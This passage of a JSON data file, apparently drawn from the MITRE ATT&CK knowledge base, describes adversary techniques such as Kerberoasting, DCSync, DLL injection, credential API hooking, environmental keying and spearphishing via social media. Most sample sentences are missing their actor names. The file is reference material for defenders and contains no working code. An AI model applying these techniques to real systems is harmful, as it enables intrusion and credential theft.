    "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and [Net](https://attack.mitre.org/software/S0039).[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
    "similar_words": [
      "Service Execution"
    ],
    "id": "T1569.002"
  },
  "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65": {
    "name": "Cloud Accounts",
    "example_uses": [
      "During the   used a compromised O365 administrator account to create a new Service Principal.",
      "has gained access to a global administrator account in Azure AD and has used `Service Principal` credentials in Exchange.",
      "has accessed Microsoft M365 cloud environments using stolen credentials.",
      "leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.",
      "has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.",
      "During   leveraged compromised credentials from victim users to authenticate to Azure tenants.",
      "can use stolen service account tokens to perform its operations.",
      "leverages valid cloud accounts to perform most of its operations.",
      "has used compromised Office 365 accounts in tandem with  in an attempt to gain control of endpoints.",
      "has used compromised credentials to access cloud assets within a target organization.",
      "has used compromised credentials to sign into victims Microsoft 365 accounts.",
      "has abused service principals in compromised environments to enable data exfiltration."
    ],
    "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
    "similar_words": [
      "Cloud Accounts"
    ],
    "id": "T1078.004"
  },
  "attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995": {
    "name": "Environmental Keying",
    "example_uses": [
      "has been observed utilizing environmental keying in payload delivery.",
      "has encrypted payloads using the Data Protection API (DPAPI) which relies on keys tied to specific user accounts on specific machines.  has also environmentally keyed second stage malware with an RC5 key derived in part from the infected system's volume serial number.",
      "relies on a specific victim hostname to execute and decrypt important strings.",
      "can store its final payload in the Registry under `$HKLM\\SOFTWARE\\Classes\\Interface\\` encrypted with a dynamically generated key based on the drives serial number.",
      "can use Data Protection API to encrypt its components on the victims computer to evade detection and to make sure the payload can only be decrypted and loaded on one specific compromised computer.",
      "can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.",
      "The  dropper component can verify the existence of a single command line parameter and either terminate if it is not found or later use it as a decryption key.",
      "stops execution if the infected system language matches one of several languages with various versions referencing: Georgian Kazakh Uzbek Tajik Russian Ukrainian Belarussian and Slovenian."
    ],
    "description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
    "similar_words": [
      "Environmental Keying"
    ],
    "id": "T1480.001"
  },
  "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5": {
    "name": "NTFS File Attributes",
    "example_uses": [
      "The  malware platform uses Extended Attributes to store encrypted executables.",
      "used NTFS alternate data streams to hide their payloads.",
      "has the ability save and execute files as alternate data streams (ADS).",
      "has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.",
      "can be used to read and write alternate data streams.",
      "can be used to download or copy a file into an alternate data stream.",
      "hides many of its backdoor payloads in an alternate data stream (ADS).",
      "The DEADEYE.EMBED variant of  can embed its payload in an alternate data stream of a local file.",
      "If the victim is using PowerShell 3.0 or later  writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in %PROGRAMDATA%\\Windows\\.",
      "has the ability to save and execute files as an alternate data stream (ADS).",
      "has copied itself to the :bin alternate data stream of a newly created file.",
      "can abuse alternate data streams (ADS) to store content for malicious payloads.",
      "stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.",
      "Some variants of the  Trojan have been known to store data in Extended Attributes.",
      "has used NTFS to hide files.",
      "can delete itself while its process is still running through the use of an alternate data stream."
    ],
    "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
    "similar_words": [
      "NTFS File Attributes"
    ],
    "id": "T1564.004"
  },
  "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee": {
    "name": "Kerberoasting",
    "example_uses": [
      "can use the `KerberosRequestorSecurityToken.GetRequest` method to request kerberoastable service tickets.",
      "modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.",
      "uses 's Invoke-Kerberoast to request service tickets and return crackable ticket hashes.",
      "has used Rubeus MimiKatz Kerberos module and the Invoke-Kerberoast cmdlet to steal AES hashes.",
      "During  threat actors used 's `Invoke-Kerberoast` module to request encrypted service tickets and bruteforce the passwords of Windows service accounts offline.",
      "contains a module to conduct Kerberoasting.",
      "During the   obtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline.",
      "Invoke-Kerberoast module can request service tickets and return crackable ticket hashes.",
      "has used Kerberoasting PowerShell commands such as `Invoke-Kerberoast` for credential access and to enable lateral movement.",
      "can decode Kerberos 5 tickets and convert it to hashcat format for subsequent cracking.",
      "has conducted Kerberoasting attacks using a module from GitHub.",
      "used Kerberoasting techniques during ."
    ],
    "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
    "similar_words": [
      "Kerberoasting"
    ],
    "id": "T1558.003"
  },
  "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163": {
    "name": "DCSync",
    "example_uses": [
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from DCSync/NetSync.",
      "has used a DCSync command with  to retrieve credentials from an exploited controller.",
      "During   performed domain replication.",
      "During  threat actors used 's DCSync to dump credentials from the memory of the targeted system.",
      "has used DCSync attacks to gather credentials for privilege escalation routines.",
      "During the   used privileged accounts to replicate directory service data with domain controllers."
    ],
    "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)DCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
    "similar_words": [
      "DCSync"
    ],
    "id": "T1003.006"
  },
  "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0": {
    "name": "At",
    "example_uses": [
      "actors use  to schedule tasks to run self-extracting RAR archives which install  or  on other victims on a network.",
      "can set a scheduled task on the target system to execute commands remotely using .",
      "actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.",
      "has used  to register a scheduled task to execute malware during lateral movement.",
      "has the capability to schedule remote AT jobs.",
      "can be used to schedule a task on a system to be executed at a specific date or time."
    ],
    "description": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the at.allow file. If the at.allow file does not exist, the at.deny file is checked. Every username not listed in at.deny is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the at.deny exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via sudo.(Citation: GTFObins at)",
    "similar_words": [
      "At"
    ],
    "id": "T1053.002"
  },
  "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945": {
    "name": "Dynamic-link Library Injection",
    "example_uses": [
      "can inject a DLL into rundll32.exe for execution.",
      "has injected its DLL component into `EhStorAurhn.exe`.",
      "injects its DLL file into a newly spawned Internet Explorer process.",
      "can perform DLL injection.",
      "can use a .NET-based DLL named `RunPe6` for process injection.",
      "injects its DLL component into svchost.exe.",
      "has used Metasploit to perform reflective DLL injection in order to escalate privileges.",
      "can inject its payload DLL Into memory.",
      "can perform process injection by using a reflective DLL.",
      "After decrypting itself in memory  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This downloaded file is actually not dropped onto the system.",
      "has the ability to load DLLs via reflective injection.",
      "has the ability to inject a downloaded DLL into a newly created rundll32.exe process.",
      "has injected a malicious DLL into the Windows Media Player process (wmplayer.exe).",
      "has injected its orchestrator DLL into explorer.exe.  has also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.",
      "creates a suspended svchost process and injects its DLL into it.",
      "The  loader can support the `Dij` command which gives it the ability to inject DLLs into the memory of other processes.",
      "has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.",
      "has injected s DLL into a process.",
      "The  FilepakMonitor component can inject into the Bka.exe process using the `VirtualAllocEx` `WriteProcessMemory` and `CreateRemoteThread` APIs to load the DLL component.",
      "has injected the malware DLL into a target process.",
      "uses reflective DLL injection to inject the malicious library and execute the RAT.",
      "can migrate into another process using reflective DLL injection.",
      "contains a collection of CodeExecution modules that inject code (DLL shellcode) into a process.",
      "injects itself into various processes depending on whether it is low integrity or high integrity.",
      "can inject its modules into various processes using reflective DLL loading.",
      "injects into other processes to load modules.",
      "has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.",
      "has the ability to inject DLLs into processes.",
      "can perform DLL loading.",
      "performs a reflective DLL injection using a given pid.",
      "has the ability to execute a malicious DLL by injecting into `explorer.exe` on a compromised machine.",
      "loads injecthelper.dll into a newly created rundll32.exe process.",
      "injects an entire DLL into an existing newly created or preselected trusted process.",
      "During  the threat actors used a DLL named `D8B3.dll` that was injected into the Winlogon process.",
      "has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.",
      "If running in a Windows environment  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.",
      "will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
      "can inject a malicious DLL into a process.",
      "injects itself into the secure shell (SSH) process.",
      "is injected into a shared SVCHOST process.",
      "An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network including Outlook Express (msinm.exe) Outlook (outlook.exe) Internet Explorer (iexplore.exe) and Firefox (firefox.exe).",
      "has the ability to inject DLLs into specific processes.",
      "injects a DLL for  into the explorer.exe process.",
      "has a command to inject code into a process.",
      "A  malware sample performs reflective DLL injection.",
      "has injected a DLL backdoor into dllhost.exe and svchost.exe.",
      "has the ability to inject a DLL into running processes including the  DLL into explorer.exe.",
      "has the ability to inject DLLs for malicious plugins into running processes.",
      "can inject a DLL into `rundll32.exe` for execution.",
      "has loaded an encrypted DLL into memory and then executes it.",
      "can use ImprovedReflectiveDLLInjection to deploy components.",
      "can use DLL injection to load embedded files and modules.",
      "bootkit can inject a malicious DLL into the address space of running processes.",
      "can execute loadfromfile loadfromstorage and loadfrommem to inject a DLL from disk storage or memory respectively.",
      "injects itself into running instances of outlook.exe iexplore.exe or firefox.exe.",
      "has been observed injecting in to Explorer.exe and other processes.",
      "has the ability to inject itself into another process such as rundll32.exe and dllhost.exe.",
      "The  DLL has been injected reflectively into the memory of a legitimate running process.",
      "has been seen injecting a DLL into winword.exe.",
      "injects DLL files into iexplore.exe.",
      "has injected malicious DLLs into memory with read write and execute permissions.",
      "has injected a DLL into svchost.exe.",
      "is designed to be dynamic link library (DLL) injected into an infected endpoint and executed directly in memory."
    ],
    "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's AddressOfEntryPoint before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
    "similar_words": [
      "Dynamic-link Library Injection"
    ],
    "id": "T1055.001"
  },
  "attack-pattern--f4b843c1-7e92-4701-8fed-ce82f8be2636": {
    "name": "Exploits",
    "example_uses": [
      "has obtained exploit code for various CVEs.",
      "has obtained exploitation scripts against publicly-disclosed vulnerabilities from public repositories."
    ],
    "description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation: NationsBuying)In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).(Citation: TempertonDarkHotel)An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
    "similar_words": [
      "Exploits"
    ],
    "id": "T1588.005"
  },
  "attack-pattern--f4c1826f-a322-41cd-9557-562100848c84": {
    "name": "Modify Authentication Process",
    "example_uses": [
      "can intercept private keys using a trojanized ssh-add function.",
      "can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook.",
      "has trojanized the <sode>ssh_login and user-auth_pubkey functions to steal plaintext credentials.",
      "has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications.",
      "included modification of the AAA process to bypass authentication mechanisms."
    ],
    "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "similar_words": [
      "Modify Authentication Process"
    ],
    "id": "T1556"
  },
  "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6": {
    "name": "Credential API Hooking",
    "example_uses": [
      "hooks processes by leveraging its own IAT hooked functions.",
      "has hooked several Windows API functions to steal credentials.",
      "hooks processes by modifying IAT pointers to CreateWindowEx.",
      "has hooked APIs to perform a wide variety of information theft such as monitoring traffic from browsers.",
      "hooks several API functions to spawn system threads.",
      "is capable of using Windows hook interfaces for information gathering such as credential access.",
      "installs an application-defined Windows hook to get notified when a network drive has been attached so it can then use the hook to call its RecordToFile file stealing method.",
      "hooks several Win32 API functions to hijack elements of the remote system management user-interface.",
      "contains some modules that leverage API hooking to carry out tasks such as netripper.",
      "has the ability to capture RDP credentials by capturing the CredEnumerateA API",
      "uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine.",
      "hooked and overrided Versa's built-in authentication method `setUserPassword` to intercept plaintext credentials when submitted to the server."
    ],
    "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001), this technique focuses specifically on API functions that include parameters that reveal user credentials. In Windows, hooking involves redirecting calls to these functions and can be implemented via:* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)* **Import address table (IAT) hooking**, which use modifications to a processs IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)In Linux and macOS, adversaries may hook into system functions via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment variables, which enables loading shared libraries into a programs address space. For example, an adversary may capture credentials by hooking into the `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)",
    "similar_words": [
      "Credential API Hooking"
    ],
    "id": "T1056.004"
  },
  "attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed": {
    "name": "Netsh Helper DLL",
    "example_uses": [
      "can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."
    ],
    "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
    "similar_words": [
      "Netsh Helper DLL"
    ],
    "id": "T1546.007"
  },
  "attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317": {
    "name": "Spearphishing via Service",
    "example_uses": [
      "has used social media to deliver malicious files to victims.",
      "has used fake personas on social media to engage and target victims.",
      "has used various social media channels to spearphish victims.",
      "has used the e-mail notification features of legitimate file sharing services for spearphishing.",
      "has been distributed to victims via the messaging app Telegram.",
      "has sent loaders configured to run  as zip archives via Telegram.",
      "During   sent victims spearphishing messages via LinkedIn concerning fictitious jobs.",
      "has used fake job advertisements sent via LinkedIn to spearphish targets.",
      "has used the legitimate mailing service Constant Contact to send phishing e-mails.",
      "has used LinkedIn to send spearphishing links.",
      "spearphished victims via Facebook and Whatsapp.",
      "has used social media platforms including LinkedIn and Twitter to send spearphishing messages.",
      "used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.",
      "has used social media services to spear phish victims to deliver trojainized software.",
      "has used Microsoft Teams to send messages and initiate voice calls to victims posing as IT support personnel."
    ],
    "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
    "similar_words": [
      "Spearphishing via Service"
    ],
    "id": "T1566.003"
  },
  "attack-pattern--f6dacc85-b37d-458e-b58d-74fc4bbf5755": {
    "name": "Internal Proxy",
    "example_uses": [
      "has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.",
      "During the   used SSH port forwarding capabilities on public-facing systems and configured at least one instance of  to use a network pipe over SMB.",
      "used a proxy server between victims and the C2 server.",
      "has utilized a proxy tool to communicate between compromised assets.",
      "can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.",
      "can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points or provide access to a host without direct internet access.",
      "discovered system proxy settings and used them if available.",
